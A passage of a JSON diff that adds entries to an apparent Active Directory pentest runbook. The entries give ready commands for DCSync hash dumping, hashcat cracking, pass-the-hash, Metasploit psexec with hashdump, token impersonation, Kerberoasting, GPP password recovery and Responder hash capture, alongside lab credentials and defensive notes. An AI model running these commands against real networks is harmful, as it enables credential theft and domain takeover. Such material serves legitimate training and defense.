+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span>'s <code>secretsdump</code> supports several credential-dumping modes, but this runbook's core technique is the <code>-just-dc-ntlm</code> DCSync workflow. Instead of reading <code>NTDS.dit</code> from disk, the attacker abuses Active Directory replication rights to ask the Domain Controller to replicate password data over the network as if the attacker were another DC. When successful, the response can include domain-user NTLM hashes and highly sensitive secrets such as the <strong>krbtgt</strong> hash, making this one of the most powerful credential-access techniques in an AD environment.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker runs <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> <code>secretsdump</code> with DCSync-oriented parameters and privileged domain credentials.</li>\n  <li><strong>How attack works:</strong> The tool calls the directory replication interfaces and requests password replication data from the Domain Controller.</li>\n  <li><strong>How attack works:</strong> The returned domain hashes are stored for follow-on abuse such as pass-the-hash, Golden Ticket creation, or broader credential compromise.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> is available from the <a href=\"https://github.com/fortra/impacket\">Impacket project</a>. The runbook also includes non-DCSync `secretsdump` examples, but the label and graph focus on the DCSync path.</li>\n  <li><strong>Attack pre-requesite:</strong> Credentials with replication privileges such as <strong>Replicating Directory Changes</strong> and related rights, plus reachability to the Domain Controller over the relevant RPC/DCERPC channels.</li>\n  <li><strong>What attacker gains:</strong> Domain NTLM hashes and potentially the <strong>krbtgt</strong> secret, enabling broad credential abuse and long-term domain compromise.</li>\n  <li><strong>Detection/Defense opsec:</strong> Audit replication-right assignments, monitor for abnormal directory replication requests from non-DC systems, and alert on DCSync-related behaviors in AD-focused security tooling such as Microsoft Defender for Identity.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:impacket",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "54303b37-bb70-4709-8096-96b6691e86e3",
+    "label": "Offline NTLM Credential Cracking",
+    "command": "hashcat -m 1000 ~/AD-CyberMentor/hashes.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span> can perform high-speed offline cracking of Windows NTLM hashes once the attacker has already obtained them from sources such as SAM dumps, <code>NTDS.dit</code> extraction, or DCSync output. This runbook uses mode <code>1000</code>, which is specific to NTLM, together with the widely used <code>rockyou.txt</code> wordlist and GPU acceleration. Because the cracking happens offline on attacker-controlled hardware, defenders cannot stop the guessing process once the hashes are stolen; the main defensive opportunity is preventing the hashes from being exposed in the first place and ensuring passwords are strong enough to resist practical cracking.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker supplies a file of stolen NTLM hashes and a candidate wordlist to <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span>.</li>\n  <li><strong>How attack works:</strong> Hashcat computes NTLM hashes of candidate passwords at scale and compares them to the stolen values.</li>\n  <li><strong>How attack works:</strong> Any successful matches are recovered as plaintext passwords for reuse or reporting.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span> is available from the <a href=\"https://hashcat.net/hashcat/\">Hashcat project</a>. Common wordlists include <code>/usr/share/wordlists/rockyou.txt</code> on Kali Linux.</li>\n  <li><strong>Attack pre-requesite:</strong> Access to stolen NTLM hashes and an attacker-controlled system with enough CPU/GPU resources to perform offline cracking.</li>\n  <li><strong>What attacker gains:</strong> Plaintext passwords recovered from NTLM hashes, enabling password reuse, credential stuffing, and deeper access validation.</li>\n  <li><strong>Detection/Defense opsec:</strong> Offline cracking itself occurs outside the target environment, so defense focuses on strong password policy, MFA, privileged-account hygiene, and preventing exposure of hash material through earlier credential-dumping stages.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:hashcat",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#f07c0f",
+    "hasGraph": true
+  },
+  {
+    "id": "596f3c62-c3db-4ccf-a046-88c7fa444c52",
+    "label": "CME Local Pass-The-Hash",
+    "command": "crackmapexec smb 10.0.2.0/24 -u \"Frank Castle\" -H 64f12cddaa88057e06a81b54e73b949b --local-auth",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#CrackMapExec</span> supports pass-the-hash authentication over SMB by using an NTLM hash directly instead of a plaintext password. In this runbook, the <code>--local-auth</code> flag forces authentication against each target host's local SAM rather than the domain, which is especially useful when the same local administrator password or hash has been reused across multiple systems. This turns one stolen local admin hash into a potential lateral-movement primitive across a subnet without ever recovering the underlying password.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker launches CME with a username, a stolen NTLM hash, and the <code>--local-auth</code> option.</li>\n  <li><strong>How attack works:</strong> CME performs SMB authentication using NTLM challenge-response logic backed by the supplied hash material.</li>\n  <li><strong>How attack works:</strong> Any host that accepts the reused local credentials becomes a new foothold for follow-on actions.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#CrackMapExec</span> or NetExec can be installed on common offensive-security Linux distributions and from their project repositories.</li>\n  <li><strong>Attack pre-requesite:</strong> A valid NTLM hash for a local account on the target host class, plus network reachability over <span style=\"color:#3b82f6;\">SMB (TCP 445)</span>. The same local credentials typically need to be reused across multiple systems for broad impact.</li>\n  <li><strong>What attacker gains:</strong> Authenticated SMB access to hosts that accept the hash, enabling validation of password reuse and follow-on remote operations.</li>\n  <li><strong>Detection/Defense opsec:</strong> Watch for repeated SMB authentication attempts using local accounts, disable unnecessary local admin reuse with tools such as LAPS/Windows LAPS, and correlate lateral SMB logons that do not involve interactive password entry.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "phase:exploit",
+      "domain:ad",
+      "tool:crackmapexec"
+    ],
+    "hasGraph": true
+  },
+  {
+    "id": "b0dc3db7-f25e-46f5-a12d-6b01510ccc33",
+    "label": "Meterpreter PsExec Hashdump",
+    "command": "use exploit/windows/smb/psexec\nset smbdomain marvel.local\nset smbuser / password / rhosts / hosts\nrun\nhashdump",
+    "description": "<p>This runbook chains two well-known post-exploitation capabilities inside <span style=\"color:#ef4444;font-weight:bold;\">#Metasploit</span>: remote service-based execution with the <code>exploit/windows/smb/psexec</code> module, followed by local credential dumping with the Meterpreter <code>hashdump</code> command. First, valid SMB credentials are used to stage and launch a payload on the target through the Service Control Manager, producing a Meterpreter session. Once the session is established, the attacker issues <code>hashdump</code> to extract local SAM-backed credential material for reuse or cracking.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker configures the Metasploit PsExec module with target and credential details.</li>\n  <li><strong>How attack works:</strong> Metasploit authenticates over SMB, creates a remote service, and launches a payload that returns a Meterpreter session.</li>\n  <li><strong>How attack works:</strong> The attacker runs <code>hashdump</code> inside Meterpreter to retrieve local password hashes from the compromised system.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Metasploit</span> is available from the <a href=\"https://github.com/rapid7/metasploit-framework\">Metasploit Framework</a>. The relevant module is <code>exploit/windows/smb/psexec</code>.</li>\n  <li><strong>Attack pre-requesite:</strong> Valid SMB credentials with administrative rights on the target host, network reachability over <span style=\"color:#3b82f6;\">SMB (TCP 445)</span>, and sufficient privileges on the target for local hash extraction once code execution is obtained.</li>\n  <li><strong>What attacker gains:</strong> A Meterpreter foothold on the remote host and local account hash material suitable for cracking or pass-the-hash.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor for service creation, suspicious SMB admin-share access, Meterpreter-like network patterns, and subsequent credential-dumping behaviors tied to the compromised process chain.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "phase:exploit",
+      "domain:ad",
+      "tool:metasploit"
+    ],
+    "color": "#d79365",
+    "hasGraph": true
+  },
+  {
+    "id": "68243b8d-2329-4034-89f6-1c61b5e3e154",
+    "label": "Meterpreter Incognito Token Impersonate",
+    "command": "use exploit/windows/smb/psexec \nset smbdomain / smbuser / password / rhosts / hosts.. \nrun \nload incognito \nlist_tokens -u \nimpersonate_token marvel\\\\fcastle ",
+    "description": "<p>After obtaining a <span style=\"color:#ef4444;font-weight:bold;\">#Meterpreter</span> session, an attacker can load the <span style=\"color:#ef4444;font-weight:bold;\">#Incognito</span> extension to enumerate and impersonate access tokens present on the compromised Windows host. These tokens often belong to users who have logged on interactively, through services, or via remote administration, and token impersonation can temporarily give the attacker the identity and privileges of one of those users without cracking a password. In practice, this is used to pivot from a local foothold into a more useful domain identity that already has access elsewhere in the environment.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker operates from an existing Meterpreter foothold.</li>\n  <li><strong>How attack works:</strong> The <span style=\"color:#ef4444;font-weight:bold;\">#Incognito</span> extension lists impersonation candidates available on the host.</li>\n  <li><strong>How attack works:</strong> The attacker impersonates a selected token and reuses that identity for follow-on activity.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Meterpreter</span> and <span style=\"color:#ef4444;font-weight:bold;\">#Incognito</span> are components of the <a href=\"https://github.com/rapid7/metasploit-framework\">Metasploit Framework</a>.</li>\n  <li><strong>Attack pre-requesite:</strong> A working Meterpreter session and enough local privilege to enumerate or duplicate useful tokens.</li>\n  <li><strong>What attacker gains:</strong> The ability to act under another logged-on identity without knowing that user's password.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor token-manipulation behavior, suspicious Meterpreter extension usage, and process trees where a newly compromised session suddenly accesses resources as a different user.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "phase:exploit",
+      "domain:ad",
+      "tool:metasploit"
+    ],
+    "color": "#f2b269",
+    "hasGraph": true
+  },
+  {
+    "id": "1683df92-f908-45c7-b235-12d9cc48fe84",
+    "label": "Native AD Enum (net user)",
+    "command": "net user / domain\nnet user jeffadmin /domain\nnet group /domain\nnet group \"Sales Department\" /domain",
+    "description": "<p>Windows includes several native <code>net.exe</code> commands that can query basic Active Directory information without loading external tooling. Commands such as <code>net user /domain</code> and <code>net group /domain</code> enumerate domain users, groups, and the membership of specific groups through standard Windows APIs. Because this activity blends into normal administrative behavior and relies only on built-in binaries, it remains a practical low-friction way to map the directory from a domain-joined shell.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker lists domain users or inspects a specific account with <code>net user</code>.</li>\n  <li><strong>How attack works:</strong> <code>net group</code> lists domain groups and can expand the membership of a selected group.</li>\n  <li><strong>How attack works:</strong> The returned user and group data is used to identify privileged accounts and follow-on LDAP targets.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>net.exe</code> is a built-in Windows utility present on standard client and server installations.</li>\n  <li><strong>Attack pre-requesite:</strong> A domain-aware Windows shell. Standard authenticated user access is usually enough for these directory reads.</li>\n  <li><strong>What attacker gains:</strong> Domain user names, group names, and group membership information using only native binaries.</li>\n  <li><strong>Detection/Defense opsec:</strong> Native enumeration is low noise, so defenders should correlate it with suspicious shell ancestry or larger AD discovery sequences rather than the commands alone.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#6ddcf8",
+    "hasGraph": true
+  },
+  {
+    "id": "4ec3ee4b-c2dc-40b4-b9b6-57d521be0a36",
+    "label": "Manual ADsPath Discovery (.NET)",
+    "command": "$PDC = [[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName\n$LDAP = \"LDAP://$PDC/$DN\"",
+    "description": "<p>Before performing custom .NET-based LDAP searches, an attacker often needs to construct a correct LDAP path that points at the current domain. This PowerShell sequence uses <code>System.DirectoryServices.ActiveDirectory.Domain</code> to find the Primary Domain Controller and <code>[adsi]</code> to recover the current domain's distinguished name, then combines both values into a reusable <code>LDAP://</code> ADSPath string. That ADSPath becomes the base connection string for later <code>DirectoryEntry</code> and <code>DirectorySearcher</code> operations, making this a foundational setup step for manual AD enumeration without PowerView.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker queries .NET domain objects to identify the current domain's PDC.</li>\n  <li><strong>How attack works:</strong> ADSI retrieves the current domain's distinguished name.</li>\n  <li><strong>How attack works:</strong> Both values are combined into a valid LDAP ADSPath string for later searches.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>System.DirectoryServices</code> and ADSI are standard Windows/.NET functionality accessible from PowerShell.</li>\n  <li><strong>Attack pre-requesite:</strong> A domain-aware PowerShell session on a Windows host. Standard authenticated user access is typically sufficient.</li>\n  <li><strong>What attacker gains:</strong> A reusable LDAP binding path that points at the right domain controller and naming context for manual searches.</li>\n  <li><strong>Detection/Defense opsec:</strong> This setup action is low noise but may still appear in PowerShell logging when part of a larger custom LDAP enumeration chain.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "domain:ad",
+      "shell:powershell",
+      "phase:recon"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "27a7fec8-c0a8-4a8c-a0bb-fce439ec80b5",
+    "label": "Custom LDAP User Enum (.NET)",
+    "command": "$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = $domainObj.PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName\n$LDAP = \"LDAP://$PDC/$DN\"\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"samAccountType=805306368\"\n$result = $dirsearcher.FindAll()\nForeach($obj in $result)\n{\nForeach($prop in $obj.Properties)\n{\n$prop\n}\nWrite-Host \"-------------------------------\"\n}\n",
+    "description": "<p>This runbook performs manual Active Directory user enumeration by creating a <code>DirectoryEntry</code> and <code>DirectorySearcher</code> object directly in PowerShell. Instead of relying on PowerView, the attacker binds to LDAP with a hand-built ADSPath and applies the filter <code>samAccountType=805306368</code> to retrieve normal user objects from the directory. Because <code>DirectorySearcher</code> can return every exposed property on each result, this pattern is useful for custom reconnaissance when an operator wants fine control over filters, properties, and result handling.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker builds an LDAP path to the current domain and creates a <code>DirectoryEntry</code> object.</li>\n  <li><strong>How attack works:</strong> A <code>DirectorySearcher</code> applies a user-object filter and submits it to Active Directory.</li>\n  <li><strong>How attack works:</strong> The attacker iterates through the results and inspects the returned properties for each matching user.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>DirectoryEntry</code> and <code>DirectorySearcher</code> are standard .NET classes exposed through PowerShell.</li>\n  <li><strong>Attack pre-requesite:</strong> A domain-aware PowerShell session with ordinary authenticated read access to Active Directory.</li>\n  <li><strong>What attacker gains:</strong> LDAP-backed property sets for domain user objects, supporting tailored discovery and target profiling.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor PowerShell logging and unusual LDAP query patterns from endpoints that do not normally perform custom directory searches.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "domain:ad",
+      "shell:powershell",
+      "phase:recon"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "428f136c-d8c2-4fbc-a062-ae89cb7a9980",
+    "label": "PowerShell Execution Policy Bypass",
+    "command": "powershell -ep bypass\n.\\enumeration.ps1",
+    "description": "<p>Windows PowerShell execution policy is a safety control intended to reduce accidental script execution, but it is not a security boundary. By launching PowerShell with <code>-ep bypass</code>, an attacker can run unsigned local scripts in the current process even when stricter execution policies would normally block them. This is commonly used to load enumeration, credential, or post-exploitation scripts from disk without permanently changing the system-wide policy configuration.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker opens a new PowerShell process with the <code>-ep bypass</code> flag.</li>\n  <li><strong>How attack works:</strong> The new PowerShell instance ignores the effective execution-policy restriction for that process scope.</li>\n  <li><strong>How attack works:</strong> The attacker executes an unsigned local script such as an enumeration or post-exploitation helper.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>powershell.exe</code> is built into Windows. The bypass behavior is part of normal PowerShell process options.</li>\n  <li><strong>Attack pre-requesite:</strong> Local command execution on a Windows host and access to the script file the attacker wants to run.</li>\n  <li><strong>What attacker gains:</strong> The ability to execute unsigned PowerShell content in-process without changing global execution policy.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor PowerShell command-line arguments for <code>-ep bypass</code> and rely on AMSI, script-block logging, and application control rather than execution policy alone.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "domain:ad",
+      "shell:powershell",
+      "phase:exploit"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "97784acb-ff9f-43f6-871b-d1b0898e04a7",
+    "label": "Search User Groups (.NET LDAP)",
+    "command": "$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"name=jeffadmin\"\n$result = $dirsearcher.FindAll()\nForeach($obj in $result)\n{\nForeach($prop in $obj.Properties)\n{\n$prop.memberof\n}\nWrite-Host \"-------------------------------\"\n}\n\n",
+    "description": "<p>This PowerShell sequence uses <code>System.DirectoryServices.DirectorySearcher</code> to find a specific user object in Active Directory and then read its <code>memberOf</code> property directly from LDAP results. It is a lightweight way to resolve group membership without relying on PowerView or RSAT tooling, and it is particularly useful when an attacker wants to inspect the security context of a single high-value account such as an administrator or service identity. Because group membership often determines privilege, delegation paths, and Kerberoasting value, this lookup is a common follow-on to username discovery.</p>\n<ol><li><strong>How attack works:</strong> The attacker builds a <code>DirectorySearcher</code> object tied to the current domain.</li><li><strong>How attack works:</strong> An LDAP filter searches for a specific user by name.</li><li><strong>How attack works:</strong> The returned object's <code>memberOf</code> values are extracted and reviewed.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <code>System.DirectoryServices</code> classes are built into Windows/.NET and are accessible from PowerShell.</li><li><strong>Attack pre-requesite:</strong> A PowerShell session with authenticated access to query the current domain.</li><li><strong>What attacker gains:</strong> Direct visibility into the group memberships of a chosen user account.</li><li><strong>Detection/Defense opsec:</strong> The query is low noise but still appears in PowerShell and LDAP telemetry if monitored centrally.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "domain:ad",
+      "shell:powershell",
+      "phase:recon"
+    ],
+    "color": "#d4ea34",
+    "hasGraph": true
+  },
+  {
+    "id": "9b6a9c14-45bd-4879-94e8-45a6ff6135e3",
+    "label": "Advanced LDAP Filtering",
+    "command": "\n1) Expose Filters as Argument: Then search by samAccountType users\n\nfunction LDAPSearch {\nparam (\n[string]$LDAPQuery\n)\n$PDC =\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DistinguishedName = ([adsi]'').distinguishedName\n$DirectoryEntry = New-Object\nSystem.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\")\n$DirectorySearcher = New-Object\nSystem.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)\nreturn $DirectorySearcher.FindAll()\n}\n\n2) To run it :\n\nPS > Import-Module .\\function.ps1\nPS > LDAPSearch -LDAPQuery \"(samAccountType=805306368)\"\n\n3) Search by object type (group in this case)\nPS > LDAPSearch -LDAPQuery \"(objectclass=group)\"\n\n>> This for instane can enumerate more groups than net.exe\n\n4) Enumerate every group, with user members \nPS>  foreach ($group in $(LDAPSearch -LDAPQuery\n\"(objectCategory=group)\")) {\n>> $group.properties | select {$_.cn}, {$_.member}\n>> }\n",
+    "description": "<p>This runbook turns manual LDAP enumeration into a reusable PowerShell function by exposing the LDAP filter as an argument. Instead of hardcoding a single search for users or groups, the attacker can pass different filter expressions to search for user objects, groups, group members, service accounts, or other targeted subsets of Active Directory. That flexibility makes the function a compact custom recon primitive for operators who want PowerView-like adaptability while relying only on native PowerShell and .NET directory classes.</p>\n<ol><li><strong>How attack works:</strong> The attacker defines a PowerShell helper that accepts an arbitrary LDAP query string.</li><li><strong>How attack works:</strong> The helper constructs a <code>DirectorySearcher</code> against the current domain and applies the supplied filter.</li><li><strong>How attack works:</strong> The resulting objects are returned and reused for targeted AD discovery.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> The technique relies on PowerShell plus built-in .NET <code>System.DirectoryServices</code> classes.</li><li><strong>Attack pre-requesite:</strong> A PowerShell session with authenticated read access to the target domain.</li><li><strong>What attacker gains:</strong> A reusable LDAP-search primitive for targeted AD object discovery without external tooling.</li><li><strong>Detection/Defense opsec:</strong> Monitor PowerShell logging and unusual LDAP filters originating from endpoints that do not normally perform directory administration.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "domain:ad",
+      "shell:powershell",
+      "phase:recon"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "18878974-d303-4719-8b91-ae569227afde",
+    "label": "Find Local Admin Access (PowerView)",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Find-LocalAdminAccess",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span>'s <code>Find-LocalAdminAccess</code> helps an attacker discover which domain machines the current user can administer. Instead of blindly trying lateral movement everywhere, the cmdlet walks target systems and tests whether the current credentials have the rights needed to access administrative functionality remotely. The output converts a user's existing permissions into a concrete list of hosts that are immediately reachable for service creation, remote execution, or follow-on credential theft.</p>\n<ol><li><strong>How attack works:</strong> The attacker loads <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> into the current PowerShell session.</li><li><strong>How attack works:</strong> PowerView identifies domain computers and tests whether the current user has remote local-admin access.</li><li><strong>How attack works:</strong> Accessible hosts are returned as a prioritized list for lateral movement.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>.</li><li><strong>Attack pre-requesite:</strong> A domain-aware Windows PowerShell session and credentials that may already have local administrative rights on some remote systems.</li><li><strong>What attacker gains:</strong> A list of machines where the current user likely has local admin access and can attempt immediate remote operations.</li><li><strong>Detection/Defense opsec:</strong> Monitor for broad remote admin-rights validation, unusual RPC/SMB access to many hosts from a workstation, and PowerShell logging tied to <code>Find-LocalAdminAccess</code>.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "a32203e2-7cd0-43eb-ace3-0c137b81933d",
+    "label": "Enumerate Logged On Users (Get-NetLoggedon)",
+    "command": "PS> Get-NetSession -ComputerName COMPUTERNAME -Verbose",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> can query remote Windows session information to identify which users are currently or recently logged on to a target machine. In this runbook the command uses <code>Get-NetSession</code>, which surfaces active SMB session information and helps an attacker discover where high-value users are interacting with the environment. That makes the technique useful for lateral movement planning, because it highlights endpoints most likely to contain privileged tokens or accessible data tied to administrators and service operators.</p>\n<ol><li><strong>How attack works:</strong> The attacker uses a PowerView-enabled PowerShell session.</li><li><strong>How attack works:</strong> A remote session query is sent to the target machine.</li><li><strong>How attack works:</strong> The returned session information is used to infer who is actively interacting with that system.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>.</li><li><strong>Attack pre-requesite:</strong> Network reachability to the remote host and sufficient rights to query session information over Windows networking interfaces.</li><li><strong>What attacker gains:</strong> Visibility into which users are active on a remote machine, supporting privilege and lateral-movement targeting.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual remote session queries, SMB enumeration from workstations, and PowerShell activity referencing session-enumeration cmdlets.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "c5949ffd-ce05-4b8b-89a4-a37883de987f",
+    "label": "Impacket Kerberoasting",
+    "command": "impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 10.0.2.71 -request\n\nhashcat -m 13100 ~/AD-CyberMentor/Kerberoasting/service_hash.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span>'s <code>GetUserSPNs</code> can perform Kerberoasting by enumerating service accounts that have registered SPNs and then requesting service tickets for them from the Key Distribution Center. Because the service portion of the returned ticket is encrypted with the service account's long-term secret, the attacker can export the ticket material and crack it offline with <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span>. Successful cracking reveals the service account's plaintext password and often leads to privileged lateral movement.</p>\n<ol><li><strong>How attack works:</strong> The attacker uses <code>GetUserSPNs</code> to enumerate accounts that own SPNs.</li><li><strong>How attack works:</strong> Kerberos service tickets are requested for those accounts and saved in crackable format.</li><li><strong>How attack works:</strong> The captured ticket material is cracked offline to recover service-account credentials.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> is available from the <a href=\"https://github.com/fortra/impacket\">Impacket project</a>, and <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span> is available from the <a href=\"https://hashcat.net/hashcat/\">Hashcat project</a>.</li><li><strong>Attack pre-requesite:</strong> Valid domain credentials that can request service tickets from the KDC and network reachability to the Domain Controller.</li><li><strong>What attacker gains:</strong> Crackable Kerberos service-ticket material and potentially plaintext passwords for service accounts.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual TGS requests for many SPNs, protect service accounts with long random passwords or gMSAs, and alert on Kerberoasting patterns in Kerberos telemetry.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:impacket",
+      "tool:hashcat",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "0f5f401c-0c43-4960-b9ca-4307a5439f17",
+    "label": "GPP Password Recovery",
+    "command": "crackmapexec smb 10.129.2.16 -u '' -p '' --shares\nsmbclient -L \\\\\\\\10.129.2.16\\\\\nsmbclient -L \\\\\\\\10.129.2.16\\\\Replication\nsmb: \\> prompt off  (remove smb: > )\nsmb: \\> recurse on \nsmb: \\> ls\nsmb: \\> mget *   ( get all files)\n\n#pickup Groups.xml, extract username/password, then crack password:\n\ngpp-decrypt ....password...\n",
+    "description": "<p>Legacy Group Policy Preferences stored administrative credentials inside XML files in the world-readable <code>SYSVOL</code> share using the <code>cpassword</code> field. Although Microsoft published a patch years ago, old policy backups and forgotten preference files can still expose recoverable secrets. This runbook uses share enumeration and <code>gpp-decrypt</code> to locate those XML files, extract the embedded <code>cpassword</code> value, and decrypt it with the well-known static AES key published by Microsoft.</p>\n<ol><li><strong>How attack works:</strong> The attacker enumerates accessible shares and browses <code>SYSVOL</code> or replication shares for preference XML files.</li><li><strong>How attack works:</strong> Files such as <code>Groups.xml</code> are downloaded and searched for the <code>cpassword</code> attribute.</li><li><strong>How attack works:</strong> The embedded value is decrypted locally to recover the original plaintext password.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> The workflow commonly uses <code>smbclient</code> for share access and a helper such as <code>gpp-decrypt</code> for local decryption.</li><li><strong>Attack pre-requesite:</strong> Read access to the relevant SYSVOL or replication share and the presence of legacy GPP XML files containing <code>cpassword</code>.</li><li><strong>What attacker gains:</strong> Plaintext credentials left in legacy Group Policy Preference artifacts.</li><li><strong>Detection/Defense opsec:</strong> Remove legacy GPP passwords, audit SYSVOL for old XML artifacts, and monitor unusual bulk reads of policy shares by non-admin endpoints.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "8c5b6848-b4e3-4716-b468-85395ab35487",
+    "label": "Malicious SCF/URL Drop (Responder)",
+    "command": "1) create file in share with url code (see desc!)\n2) set responder :\nsudo responder -I eth2 -v ( in attacker)",
+    "description": "<p>By dropping a malicious <code>.scf</code>, <code>.url</code>, or similar shortcut-like artifact into a writable share, an attacker can coerce Windows Explorer into reaching out to an attacker-controlled UNC path when a victim browses the folder. If <span style=\"color:#ef4444;font-weight:bold;\">#Responder</span> is listening, the victim workstation will automatically attempt SMB authentication to the attacker host, leaking NTLM challenge-response material. This is a practical forced-authentication technique for capturing hashes without convincing the user to run an executable.</p>\n<ol><li><strong>How attack works:</strong> The attacker starts <span style=\"color:#ef4444;font-weight:bold;\">#Responder</span> on the attacker host.</li><li><strong>How attack works:</strong> A malicious SCF/URL artifact referencing the attacker UNC path is written to a writable share.</li><li><strong>How attack works:</strong> When a victim browses that share, Explorer resolves the remote icon path and silently authenticates to the attacker.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Responder</span> is available from the <a href=\"https://github.com/lgandx/Responder\">Responder project</a>.</li><li><strong>Attack pre-requesite:</strong> Write access to a share or folder a victim is likely to browse, plus network reachability from the victim to the attacker over SMB or related protocols.</li><li><strong>What attacker gains:</strong> Captured NTLM challenge-response material from victims who trigger the malicious artifact.</li><li><strong>Detection/Defense opsec:</strong> Disable or harden LLMNR/NBNS where appropriate, monitor suspicious shortcut artifacts on shares, and alert on outbound SMB authentication attempts to untrusted hosts.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:responder",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
